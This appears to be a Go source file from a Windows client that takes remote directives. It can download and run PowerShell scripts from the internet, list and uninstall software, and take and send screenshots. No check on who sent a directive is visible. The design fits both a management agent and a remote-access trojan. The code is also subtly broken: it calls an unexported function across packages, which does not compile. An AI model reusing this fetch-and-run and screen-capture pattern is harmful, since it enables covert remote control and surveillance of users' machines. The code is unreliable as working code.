//go:build windows

package utils

import (
	c "corpotecht_client/common"
	"corpotecht_client/crossplatform"
	"corpotecht_client/windows"
	"log"
)

func HandleDirective(directive c.Directive) {
	defer RecoverFromCrash()

	switch directive.Command {
	case "powershell":
		if len(directive.Parameters) > 0 {
			windows.executePowershellScriptFromInternet(directive.Parameters[0])
		} else {
			log.Println("Invalid directive received.")
		}

	case "listsoftware":
		getInstalledSoftware()
	case "uninstall":
		uninstallSoftware(directive.Parameters)
	case "screenshot":
		crossplatform.TakeAndSendScreenshot()

	}
}
